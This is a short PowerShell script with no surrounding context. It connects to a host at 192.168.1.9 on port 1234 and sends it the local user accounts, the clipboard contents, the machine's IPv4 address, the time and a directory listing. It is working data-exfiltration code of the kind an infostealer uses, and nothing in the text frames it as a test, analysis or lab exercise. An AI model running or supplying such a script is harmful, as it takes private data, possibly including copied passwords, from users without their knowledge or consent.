$socket = New-Object System.Net.Sockets.TcpClient
$socket.Connect('192.168.1.9', 1234)
$ipconfig = Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq "Ethernet" -and $_.AddressFamily -eq "IPv4" }
$byte = [System.Text.Encoding]::ASCII.GetBytes('Data : ' + (Get-Date -DisplayHint Time) + ' > ' + (Get-LocalUser) + ' | ' + (Get-Clipboard) + ' | ' + ($ipconfig.IPAddress) + "`n Dirctory `n" + (Get-ChildItem))
$str = $socket.GetStream()
$str.Write($byte, 0, $byte.Length)